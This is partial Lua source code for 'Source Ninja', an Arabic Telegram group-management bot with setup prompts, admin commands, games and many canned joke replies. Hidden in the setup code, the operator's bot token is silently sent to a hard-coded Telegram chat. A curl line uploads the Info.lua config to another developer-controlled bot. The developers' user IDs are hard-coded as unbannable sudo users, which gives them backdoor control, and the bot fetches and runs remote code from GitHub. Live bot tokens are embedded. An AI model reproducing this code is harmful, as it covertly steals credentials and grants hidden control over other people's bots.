...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺  :\na⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1943020832&text=' ..token)
end 
else
print('\27[0;35m⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺  :\na⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺  ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ososs9/MS/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1978267387,1943020832,1691710259}   
...
var = true
elseif tonumber(user_id) == tonumber(1978267387) then
var = true
...
if tonumber(user_id) == tonumber(1978267387) then  
var = 'المبرمج ميدو الصغير'
elseif tonumber(user_id) == tonumber(1943020832) then
...
local UserName = (data.username_ or "so_ninja")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'نينجا') 
local DRAGON_Msg = { 
...
{
{text = '𓌹 ᯓ المطور ★ 𓌺', url="http://t.me/"..sudos.UserName},
},
{
{text = '  ᯓ اضف البوت لمجموعتك★ '   ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
},
}
...
if not DevSoFi(msg) then
local Text = [[
🚀سعر التنصيب علي سورس نينجا 
↯سعر التنصيب العادي 20جنيه فقط
🚀للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝚂𝙾8𝚈𝙴𝚁 ★ 𓌺',url="t.me/Marvel_Mido"}},
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝙺𝙴𝙱𝙴𝚁★ 𓌺 ',url="t.me/uu_blackk"}},
{{text = '𝚃𝙾𝙰𝚂𝙺🚀',url="t.me/so_ninja"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Key = {
{'╾╾╾╾⟦مطورين السورس⟧╾╾╾╾'},
{'التواصل','عايز بوت','سورس'},
{'ميدو الصغير','ميدو الكبير'},
{'𝔟𝔞𝔠𝔨 ⚡'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
local Text = ' 🚀 تم ارسال الملصق من ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/ososs9/MS/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/so_ninja/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' 🚀 اصدار سورس نينجا{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="t.me/so_ninja"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/so_ninja/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس نينجا ادخل وتابع الجديد](t.me/so_ninja)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺', url="t.me/so_ninja"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/so_ninja/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == ' ◁╾╾╾╾⟦𝙽𝙸𝙽𝙹𝙰⟧╾╾╾╾▷' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس نينجا ادخل وتابع الجديد](t.me/so_ninja)
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/so_ninja)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/so_ninja"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'ميدو الصغير مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↝المبرمج ميدو الصغير لو حابب تتواصل معاه
اتبع الزر إلى تحت ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝙼𝙸𝙳𝙾 𝙴𝙻 𝚂𝙾8𝚈𝙴𝚁🚀', url="t.me/Marvel_Mido"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 🚀 من أحسن السورسات على التليجرام سورس نينجا 🚀
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "نينجا")
...
{
{text = ' ᯓ اضف البوت لمجموعتك★ ', url = "https://t.me/"..data.username_.."?startgroup=new"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_,0," 🚀 الـعـضو  : {["..data.first_name_.."](T.ME/so_ninja)}\n 🚀 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 1978267387 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,0, " 🚀 عذرا  ⇇{["..data.first_name_.."](T.ME/so_ninja)}\n 🚀 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
 ─────── 🚀 ───────
 ...
 🚀 خلفيات ⤌ لعرض الميزه
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
𓆩 𝗖𝗛 - [ 𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺 ](t.me/so_ninja)𓆪
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝚂𝙾8𝚈𝙴𝚁 ★ 𓌺',url="t.me/Marvel_Mido"}},
{{text = '`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´', url="t.me/so_ninja"}}, 
{{text = ' ᯓ اضف البوت لمجموعتك★ ' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/so_ninja/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
╭𖤍━┅⟞⟦[𝙽𝙸𝙽𝙹𝙰](https://t.me/so_ninja)⟧⟝┉━𖤍╮
                                                                                       
 [𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★](http://t.me/so_ninja)
                                                                                          
╰𖤍━┅⟞⟦[𝙽𝙸𝙽𝙹𝙰](https://t.me/so_ninja)⟧⟝┉━𖤍╯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ¹',url="t.me/Marvel_Mido"},{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ² ', url="t.me/@uu_blackk"}},
{{text = ' 𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺', url="t.me/so_ninja"}},
{{text = 'ᯓ اضف البوت لمجموعتك★ ' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 🛡اهلا بك في سورس نينجا الجمدان 🛡
 🛡عايز بوت بأسعار منسبه وبوت مميز كلمني 🛡
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ¹',url="t.me/Marvel_Mido"},{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ² ', url="t.me/uu_blackk"}},
{{text = ' 𝚃𝙾 𝙰𝚂𝙺',url="t.me/TWL_Ninja_bot"}}, 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰', url="t.me/so_ninja"}},
{{text = 'اضف البوت تلي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/so_ninja/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[
ميدو الصغير  مبرمج السورس  للتواصل معه اتبع الزر الاسفل ⬇️🚀.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝚂𝙾8𝚈𝙴𝚁 ★ 𓌺',url="t.me/Marvel_Mido"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Marvel_Mido&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'ميدو الكبير'  then
local Text = [[
ميدو الكبير مبرمج السورس للتواصل معه اتبع الزر الاسفل ⬇️🚀.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝙺𝙴𝙱𝙴𝚁★ 𓌺',url="t.me/uu_blackk"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/uu_blackk&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if msg.text and msg.text:match( ^بنحث (.*)$ ) and not redis:get(mero.. dw:bot:api ..msg.chat_id_) then            
local Ttext = msg.text:match( ^بنحث (.*)$ ) 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بوت اليوتيوب ♥️',url="t.me/Youtube_Ninja_bot"}},
...
{{text = '🚀رواية "أرض زيكولا"',url="https://t.me/so_ninja"}},
{{text = '🚀موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/so_ninja"}},
{{text = '🚀رواية "الشفق الجزء الأول"', url="https://t.me/so_ninja"}},
{{text = '🚀رواية "المخلوق', url="https://t.me/so_ninja"}},
{{text = '🚀رواية "بعد النسيان"', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/so_ninja"}},
{{text = '🚀رواية "واختفى كل شئ"', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀رواية "نيلوفر أسود"', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀رواية"جثة في الفندق"', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀رواية "في القطار السريع"', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀لقاء مع كاتب رعب"', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀رواية"الإنسان الأخير""', url="https://t.me/t.me/so_ninja"}},
{{text = '🚀رواية" مقبرة الحيوانات""', url="https://t.me/so_ninja"}},
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝚂𝙾8𝚈𝙴𝚁 ★ 𓌺',url="t.me/Marvel_Mido"}},
{{text = '𓌹 ᯓ 𝙼𝙸𝙳𝙾 𝙴𝙻 𝙺𝙴𝙱𝙴𝚁★ 𓌺 ',url="t.me/uu_blackk"}},
{{text = '𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺', url="t.me/so_ninja"}},
}
...
local Text = [[
مطورين ومبرمجين سورس نينجا اتبع الازرار للتواصل معهم ⬇️🚀
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Story_Ninja/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "صور انيمي" or text == 'انيمي' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(17,44); 
...
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙰𝙸𝙳𝙰](http://t.me/so_ninja)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´', url="t.me/so_ninja"}}, 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺](t.me/so_ninja)
[ᴛᴡᴀѕʟ sᴏᴜʀᴄᴇ](t.me/TWL_Ninja_bot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´', url="t.me/so_ninja"}}, 
...
if text == 'العاب نينجا' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
↯ اهلا في قائمه الالعاب المتطوره سورس نينجا ↯
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[معاك مطور البوت اهو ياروحي ⇈⇊](t.me/so_ninja)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Marvel_Mido/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
text == "تويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='مرحبا إليك تويت بالصور🚀' 
keyboard = {}  
keyboard.inline_keyboard = { 
...
if tonumber(result.sender_user_id_) == tonumber(1978267387) then  
...
if result.id_ == tonumber(1978267387) then
...
if tonumber(userid) == tonumber(1978267387) then  
send(msg.chat_id_, msg.id_, " لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ososs9/MS/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 🚀 اهلا بك في متجر ملفات نينجا\n 🚀 ملفات السورس ⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n 🚀 علامة تعني { ✔️ } ملف مفعل\n 🚀 علامة تعني { ✖ } ملف معطل\n 🚀 قناة سورس نينجا⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n".." 🚀 [اضغط هنا لدخول](t.me/so_ninja) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ososs9/MS/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," 🚀 عذرا الملف لايدعم سورس نينجا\n") 
end
return false
end
...
if text == ("مسح قائمه نينجا") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 🚀 تم مسح قائمه نينجا')
return false
end

if text == 'قائمه نينجا' and Sudo(msg) then
...
if text == ("رفع نينجا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع نينجا@(.*)$") and Sudo(msg) then
local username = text:match("^رفع نينجا@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع نينجا(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع نينجا(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل نينجا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل نينجا@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل نينجا@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل نينجا(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل نينجا(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
------------------------------------------------------------------------ adddev2 sudog
if text == ("رفع ساموراي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🚀 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'so_ninja')..')'
...
' }\n'..' 🚀  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 🚀  الرفع  ⇇{ '..setadd..
' }\n'..' 🚀  الحظر  ⇇{ '..banm..' }\n\n 🚀 ═───═❲[`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´](t.me/so_ninja)❳═───═ 🚀 \n 🚀 قناة سورس نينجا⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \n [ ❲[`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´](t.me/so_ninja)❳](t.me/so_ninja) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ \nاضغط علي الاسم ليتم نسخه\n⩹━━━⊶⟦𝙽𝙸𝙽𝙹𝙰⟧⊷━━━⩺ ٴ\n 🚀 ❲[`𓌹 ᯓ𝚂𝙾𝚄𝚁𝙲𝙴 𝙽𝙸𝙽𝙹𝙰 ★ 𓌺´](t.me/so_ninja)❳ 🚀 ')
end
...
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس نينجا🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي ??',
...
if text == "تnويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
...
end --الكود حصري سورس نينجايعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'نينجا').." غادر" or text == 'غادر' then  
...
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"~ انت هنا "..Rutba(msg.sender_user_id_,msg.chat_id_).." ✹💕", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚❤️](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..😒♥️](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚❤️](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..🌚♥️](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب😑😂](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي😹👻](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب..🙂](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي..🥺💔](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اوه ياه..🌝😂](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[امك اسمها احلام..😹😹](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك ❤️😂](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خلصتت روحكك يبعيد😹💔](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتفكر في اي..🤔](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 💋🥰](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[محات حياتي يروحي..🌚💔](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[القمر ده شبهك..🙂♥️](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي..💛](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي..🐣😹](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[دايما ياحبيبي..🌚💜](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه النينجا](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚❤️](t.me/so_ninja)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص..😂😜](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰❤️](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام..🌚🖤](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال..😹](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عيب ياوسخ..🙄💔](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم يا مطوري..🥺💔](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح..😹👻](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح..😹👻](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صح النوم..😂](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صباح العسل 🍯🙂](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي..🙂💛](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🥺💔](t.me/so_ninja)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺❤️](t.me/so_ninja)')
return false
end
end
end
...
